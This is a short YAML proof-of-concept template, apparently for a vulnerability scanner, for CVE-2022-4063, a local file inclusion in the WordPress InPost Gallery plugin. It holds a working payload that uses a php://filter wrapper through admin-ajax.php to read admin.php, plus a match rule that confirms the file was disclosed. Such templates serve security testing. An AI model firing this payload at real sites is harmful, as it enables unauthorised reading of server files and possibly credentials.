name: poc-yaml-wp-inpost-gallery-cve-2022-4063-lfi
binding: 103725a6-1d58-4ee2-857a-32b1b4def5c5
manual: true
detail:
    author: socat
    links:
        - https://wpscan.com/vulnerability/6bb07ec1-f1aa-4f4b-9717-c92f651a90a7
    vulnerability:
        level: critical
transport: http
set:
    content: |-
        '{"pagepath": "php://filter/convert.base64-encode/resource=admin.php"}'
    payload: urlencode(base64(content))
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /wp-admin/admin-ajax.php?action=inpost_gallery_get_gallery&popup_shortcode_key=inpost_fancy&popup_shortcode_attributes={{payload}}
            follow_redirects: false
        expression: response.status == 200 && bytes(base64Decode(response.body)).bcontains(bytes("'WP_NETWORK_ADMIN'")) && bytes(base64Decode(response.body)).bcontains(bytes("admin_url( 'upgrade.php?_wp_http_referer='"))
expression: r0()
